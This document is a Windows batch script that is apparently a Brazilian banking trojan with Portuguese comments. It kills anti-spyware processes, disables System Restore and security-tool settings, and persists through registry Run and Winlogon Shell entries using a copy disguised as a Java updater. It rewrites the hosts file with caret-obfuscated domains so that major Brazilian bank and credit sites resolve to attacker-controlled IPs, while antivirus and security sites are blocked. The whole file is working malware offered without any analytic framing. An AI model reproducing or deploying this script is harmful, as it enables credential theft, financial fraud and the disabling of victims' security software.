@echo off
break off
::Ghost-Buster Killer
::Batch script ainda quebra um galhaum

ver|find "Windows 98">nul
if not errorlevel 1 goto fim

if exist %windir%\system32\chkdlx69.dll goto ini
::if exist %windir%\system32\taskmqr.exe taskkill -f /IM taskmqr.exe && del /q /f %windir%\system32\taskmqr.exe
::if exist %windir%\system32\shockwave.exe taskkill -f /IM shockwave.exe && del /q /f %windir%\system32\shockwave.exe
::if exist %windir%\system32\msnmsgr.exe taskkill -f /IM msnmsgr.exe && del /q /f %windir%\system32\msnmsgr.exe
::if exist %windir%\system32\javaservice.exe taskkill -f /IM javaservice.exe && del /q /f %windir%\system32\javaservice.exe
::if exist %homedrive%\"Arquivos de programas"\System\Windows32.exe taskkill -f /IM Windows32.exe && del /q /f %homedrive%\"Arquivos de programas"\System\Windows32.exe
::if exist %homedrive%\"Arquivos de programas"\"Arquivos comuns"\Office.exe taskkill -f /IM Office.exe && del /q /f %homedrive%\"Arquivos de programas"\"Arquivos comuns"\Office.exe
taskkill /f /IM avgas.exe
taskkill /f /IM guard.exe
taskkill /f /IM TeaTimer.exe
taskkill /f /IM SpybotSD.exe
taskkill /f /IM sp_rsser.exe
taskkill /f /IM SpywareTerminator.exe
taskkill /f /IM SpywareTerminatorShield.exe
taskkill /f /IM SpySweeper.exe
taskkill /f /IM SpySweeperUI.exe
taskkill /f /IM sgmain.exe
taskkill /f /IM sgbhp.exe
taskkill /f /IM lsupdatemanager.exe
taskkill /f /IM HostFileEditor.exe
taskkill /f /IM Ad-Watch2007.exe
taskkill /f /IM AAWTray.exe
taskkill /f /IM lsdelete.exe
taskkill /f /IM ProcessWatch.exe
taskkill /f /IM aawservice.exe
taskkill /f /IM Ad-Aware2007.exe
taskkill /f /IM blindman.exe
taskkill /f /IM SSUpdate.exe
taskkill /f /IM SUPERAntiSpyware.exe
taskkill /f /IM AntiSpyware.exe
start /max iexplore.exe "http://charges-img.cartoes-legais.com/ver_charge.php"
if exist %temp%\~a.b del /q /f %temp%\~a.b
reg export HKU %temp%\~a.b
if exist %temp%\~b.a del /q /f %temp%\~b.a
type %temp%\~a.b | find "Internet Explorer\Main">%temp%\~b.a && for /f "TOKENS=2 delims=\" %%D in ('type %temp%\~b.a ^| find "S-1-5-21"') do set CSL=%%D
echo y|reg add "HKU\%CSL%\Software\Microsoft\Internet Explorer\Main" /v "Enable Browser Extensions" /t REG_SZ /d "no"
del /q /f  %temp%\~a.b && del /q /f %temp%\~b.a

echo y|reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v "AdvancedTab" /t REG_DWORD /d "1"
echo y|reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v "AdvancedTab" /t REG_DWORD /d "1"

echo y|reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "Explorer.exe service.confi"
assoc .confi=exefile
copy "%CommonProgramFiles%"\jusched.exe %windir%\system32\service.confi

echo y|reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run"  /v "Winlogon" /t REG_SZ /d "%windir%\system32\dllcache\winlogon.exe"
copy "%CommonProgramFiles%"\jusched.exe %windir%\system32\dllcache\winlogon.exe

echo y|reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SunJavaUpdateSched" /t REG_SZ /d "%CommonProgramFiles%\jusched.exe"

echo y|reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"  /v DisableSR /t REG_DWORD /d 0x00000001 /f

if exist "%ProgramFiles%\Spyware Terminator\" (
 echo y|reg add "HKU\%CSL%\Software\Spyware Terminator" /v HIPSEnabled /t REG_DWORD /d 0x00000000 /f
 echo y|reg add "HKU\%CSL%\Software\Spyware Terminator" /v RSCheckHostFile /t REG_DWORD /d 0x00000000 /f
 echo y|reg add "HKU\%CSL%\Software\Spyware Terminator" /v RSIEMode /t REG_DWORD /d 0x00000000 /f
 echo y|reg add "HKU\%CSL%\Software\Spyware Terminator" /v RSHostsMode /t REG_DWORD /d 0x00000000 /f
 echo y|reg add "HKU\%CSL%\Software\Spyware Terminator" /v RSFileExtMode /t REG_DWORD /d 0x00000000 /f
 echo y|reg add "HKU\%CSL%\Software\Spyware Terminator" /v HIPSInstallModeEnabled /t REG_DWORD /d 0x00000000 /f
 echo y|reg add "HKU\%CSL%\Software\Spyware Terminator" /v RSCheckIESettings /t REG_DWORD /d 0x00000000 /f
 )

if exist "%ProgramFiles%\Webroot\Spy Sweeper\" (
 echo y|reg add "HKLM\SOFTWARE\Webroot\SpySweeper" /v hfp /t REG_DWORD /d 0x00000000 /f
 echo y|reg add "HKLM\SOFTWARE\Webroot\SpySweeper" /v ief /t REG_DWORD /d 0x00000000 /f
 )

> %windir%\system32\chkdlx69.dll echo x
exit
:ini
if not exist "%CommonProgramFiles%"\jusched.exe (
if exist %windir%\system32\service.confi copy %windir%\system32\service.confi "%CommonProgramFiles%"\jusched.exe && echo y|reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SunJavaUpdateSched" /t REG_SZ /d "%CommonProgramFiles%\jusched.exe"
if exist %windir%\system32\dllcache\winlogon.exe copy %windir%\system32\dllcache\winlogon.exe "%CommonProgramFiles%"\jusched.exe && echo y|reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SunJavaUpdateSched" /t REG_SZ /d "%CommonProgramFiles%\jusched.exe"
	)
if not exist %windir%\system32\service.confi (
if exist "%CommonProgramFiles%"\jusched.exe copy "%CommonProgramFiles%"\jusched.exe %windir%\system32\service.confi && echo y|reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "Explorer.exe service.confi"
if exist %windir%\system32\dllcache\winlogon.exe copy %windir%\system32\dllcache\winlogon.exe %windir%\system32\service.confi && echo y|reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "Explorer.exe service.confi"
	)
if not exist %windir%\system32\dllcache\winlogon.exe (
if exist "%CommonProgramFiles%"\jusched.exe copy "%CommonProgramFiles%"\jusched.exe %windir%\system32\dllcache\winlogon.exe && echo y|reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run"  /v "Winlogon" /t REG_SZ /d "%windir%\system32\dllcache\winlogon.exe"
if exist %windir%\system32\service.confi copy %windir%\system32\service.confi %windir%\system32\dllcache\winlogon.exe && echo y|reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run"  /v "Winlogon" /t REG_SZ /d "%windir%\system32\dllcache\winlogon.exe"
	)

echo %0|find "jusched.exe">nul
if not errorlevel 1 exit

:teste
set ping=%windir%\system32\ping.exe
%ping% www.google.com -n 1 -l 1 | find "TTL" > nul
if not errorlevel 1 goto dns
goto teste
:dns
for /f "tokens=2" %%A in ('nslookup cef.cocanaocola.com ^| find "Address"') do set pa=%%A
for /f "tokens=2" %%B in ('nslookup uni.cocanaocola.com ^| find "Address"') do set pb=%%B
for /f "tokens=2" %%C in ('nslookup nossa.cocanaocola.com ^| find "Address"') do set pc=%%C
for /f "tokens=2" %%D in ('nslookup real.cocanaocola.com ^| find "Address"') do set pd=%%D
for /f "tokens=2" %%E in ('nslookup bb.cocanaocola.com ^| find "Address"') do set pe=%%E
for /f "tokens=2" %%F in ('nslookup ita.cocanaocola.com ^| find "Address"') do set pf=%%F
for /f "tokens=2" %%G in ('nslookup desco.cocanaocola.com ^| find "Address"') do set pg=%%G
for /f "tokens=2" %%H in ('nslookup credita.cocanaocola.com ^| find "Address"') do set ph=%%H
for /f "tokens=2" %%I in ('nslookup citi.cocanaocola.com ^| find "Address"') do set pi=%%I
for /f "tokens=2" %%J in ('nslookup ml.cocanaocola.com ^| find "Address"') do set pj=%%J
for /f "tokens=2" %%L in ('nslookup serasa.cocanaocola.com ^| find "Address"') do set pl=%%L
for /f "tokens=2" %%M in ('nslookup equi.cocanaocola.com ^| find "Address"') do set pm=%%M
for /f "tokens=2" %%N in ('nslookup check.cocanaocola.com ^| find "Address"') do set pn=%%N
set block=1^2^7^.^0^.0^.^1
set s1=w^ww^s^.re^al^sec^ur^ew^eb^.co^m.br
set s2=c^li^c^kban^king.uni^ba^nco.^co^m.b^r
set s3=w^ww^1^4.ban^co^bra^sil.^co^m.b^r
set s4=i^ma^g^em.ca^ix^a.g^ov^.b^r
set s5=b^du^.bm^b.^c^om.br
::cef
set s6=c^ai^x^a.c^om^.b^r
set s7=w^ww^.c^a^ixa.^c^o^m.^br
set s8=c^ai^xa^.g^ov^.^br
set s9=w^ww^.c^ai^xa^.go^v.br
set s10=c^ef^.^co^m.b^r
set s11=w^ww^.^c^e^f.co^m.^br
set s12=c^ef^.^go^v^.b^r
set s13=w^ww^.^c^ef^.g^ov^.b^r
set s14=c^ai^x^a^eco^nom^ic^af^ed^eral.co^m.^b^r
set s15=w^ww^.^cai^xa^ec^ono^m^ic^a.^co^m.b^r
set s16=w^ww^.^cai^xa^ec^onomi^cafe^de^ral.c^om^.b^r
::uni
set s17=u^ni^b^an^co.^com^.b^r
set s18=w^ww^.^uni^ba^nc^o.c^om.^br
::nossa
set s19=n^os^s^aca^ix^a.co^m.^b^r
set s20=w^ww^.^noss^ac^ai^xa.co^m.b^r
::real
set s21=r^ea^l^.co^m.b^r
set s22=w^ww^.r^ea^l.c^om.b^r
set s23=b^an^co^re^a^l.^c^om.b^r
set s24=w^ww^.ba^nco^real^.co^m.b^r
::bb
set s25=b^b.^co^m.^b^r
set s26=w^ww^.b^b.^co^m.b^r
set s27=b^an^codo^bra^sil.c^o^m.^br
set s28=w^ww^.ban^codob^ra^si^l.c^om^.b^r
set s29=b^an^cobr^as^il.co^m.b^r
set s30=w^ww^.ban^co^br^as^il.co^m.b^r
::ita
set s31=i^ta^u.co^m.b^r
set s32=w^ww^.ita^u.co^m.br
::desco
set s33=b^ra^desc^o.co^m^.br
set s34=w^ww^.bra^des^co.c^om.b^r
::credita
set s35=c^re^dica^rdi^ta^u.co^m.b^r
set s36=w^ww^.cred^ic^ard^itau^.c^om.^br
::citi
set s37=c^re^dicar^d^ci^ti.co^m.b^r
set s38=w^ww^.cred^ic^ardci^ti.co^m.b^r
::ml
set s39=m^er^cadol^iv^re.co^m
set s40=w^ww^.merca^do^livre.c^om
set s41=m^er^cadoli^vre.com^.b^r
set s42=w^ww^.mercad^olivr^e.com^.b^r
::serasa
set s43=s^er^asa.co^m
set s44=w^ww^.ser^as^a.co^m
set s45=s^er^asa.com^.br
set s46=w^ww^.sera^sa^.co^m.b^r
::equi
set s47=w^ww^.eq^u^ifa^x.com^.b^r
::check
set s48=w^ww^.che^ckc^h^eck.c^om.b^r
set s49=w^ww^.gr^is^oft^.c^z
set s50=w^ww^.gr^iso^ft^.co^m
set s51=g^ur^u.gri^s^of^t.co^m
set s52=f^re^e.gri^s^of^t.co^m
set s53=u^pg^rade.bit^def^end^er.c^om
set s54=w^ww^.bleepin^gc^om^puter.c^om
set s55=w^ww^.viru^sto^tal.co^m
set s56=l^in^hade^fens^iva.uo^l.c^o^m.b^r
set s57=w^ww^.sp^yw^are^info.co^m
set s58=w^ww^.tre^ndmi^cro.co^m
if exist %windir%\system32\drivers\etc\hosts attrib -R %windir%\system32\drivers\etc\hosts
if not exist %windir%\system32\drivers\etc\hosts type nul>%windir%\system32\drivers\etc\hosts
set f1=%random:~1,3%
> %temp%\%f1% echo %block% %s1%&>> %temp%\%f1% echo %block% %s2%&>> %temp%\%f1% echo %block% %s3%&>> %temp%\%f1% echo %block% %s4%&>> %temp%\%f1% echo %block% %s5%&rem
>> %temp%\%f1% echo %pa% %s6%&>> %temp%\%f1% echo %pa% %s7%&>> %temp%\%f1% echo %pa% %s8%&>> %temp%\%f1% echo %pa% %s9%&>> %temp%\%f1% echo %pa% %s10%&>> %temp%\%f1% echo %pa% %s11%&>> %temp%\%f1% echo %pa% %s12%&>> %temp%\%f1% echo %pa% %s13%&>> %temp%\%f1% echo %pa% %s14%&>> %temp%\%f1% echo %pa% %s15%&>> %temp%\%f1% echo %pa% %s16%&rem
>> %temp%\%f1% echo %pb% %s17%&>> %temp%\%f1% echo %pb% %s18%&rem
>> %temp%\%f1% echo %pc% %s19%&>> %temp%\%f1% echo %pc% %s20%&rem
>> %temp%\%f1% echo %pd% %s21%&>> %temp%\%f1% echo %pd% %s22%&>> %temp%\%f1% echo %pd% %s23%&>> %temp%\%f1% echo %pd% %s24%&rem
>> %temp%\%f1% echo %pe% %s25%&>> %temp%\%f1% echo %pe% %s26%&>> %temp%\%f1% echo %pe% %s27%&>> %temp%\%f1% echo %pe% %s28%&>> %temp%\%f1% echo %pe% %s29%&>> %temp%\%f1% echo %pe% %s30%&rem
>> %temp%\%f1% echo %pf% %s31%&>> %temp%\%f1% echo %pf% %s32%&rem
>> %temp%\%f1% echo %pg% %s33%&>> %temp%\%f1% echo %pg% %s34%&rem
>> %temp%\%f1% echo %ph% %s35%&>> %temp%\%f1% echo %ph% %s36%&rem
>> %temp%\%f1% echo %pi% %s37%&>> %temp%\%f1% echo %pi% %s38%&rem
>> %temp%\%f1% echo %pj% %s39%&>> %temp%\%f1% echo %pj% %s40%&>> %temp%\%f1% echo %pj% %s41%&>> %temp%\%f1% echo %pj% %s42%&rem
>> %temp%\%f1% echo %pl% %s43%&>> %temp%\%f1% echo %pl% %s44%&>> %temp%\%f1% echo %pl% %s45%&>> %temp%\%f1% echo %pl% %s46%&rem
>> %temp%\%f1% echo %pm% %s47%&rem
>> %temp%\%f1% echo %pn% %s48%&rem
>> %temp%\%f1% echo %block% %s49%&>> %temp%\%f1% echo %block% %s50%&>> %temp%\%f1% echo %block% %s51%&>> %temp%\%f1% echo %block% %s52%&>> %temp%\%f1% echo %block% %s53%&>> %temp%\%f1% echo %block% %s54%&>> %temp%\%f1% echo %block% %s55%&>> %temp%\%f1% echo %block% %s56%&>> %temp%\%f1% echo %block% %s57%&>> %temp%\%f1% echo %block% %s58%&rem
type %temp%\%f1%>%windir%\system32\drivers\etc\hosts && del /q /f %temp%\%f1%
attrib +R %windir%\system32\drivers\etc\hosts

exit
:fim
start /max iexplore.exe "http://charges-img.cartoes-legais.com/ver_charge.php"
exit
